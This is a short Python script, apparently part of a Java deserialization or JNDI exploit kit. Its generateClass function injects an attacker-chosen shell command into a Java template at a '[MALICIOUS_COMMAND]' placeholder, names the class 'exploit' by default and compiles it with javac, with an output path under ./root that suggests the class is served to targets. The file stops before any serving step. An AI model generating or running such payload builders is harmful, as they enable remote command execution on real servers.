import os
import json
import subprocess
import shutil

TEMPLATE_PATH = f"./template/sample.java"


def generateClass(command, class_name="exploit"):
    TEMPLATE_OUT = f"./tmp/{class_name}.java"
    CLASS_OUT = f"./tmp/{class_name}.class"
    SERVER_OUT = f"./root/{class_name}.class"

    cmds = command.split(" ")
    cmds = json.dumps(cmds)[1:-1]

    # read sample.java
    script = open(TEMPLATE_PATH, 'r')
    content = script.read()
    script.close()

    # replace malicious code
    content = content.replace("[MALICIOUS_COMMAND]", cmds)
    content = content.replace("[CLASS_NAME]", class_name)

    # save in tmp folder
    with open(TEMPLATE_OUT, 'w+') as fd:
        fd.write(content)

    # compile java file
    subprocess.Popen(f'javac {TEMPLATE_OUT}', shell=True).wait()
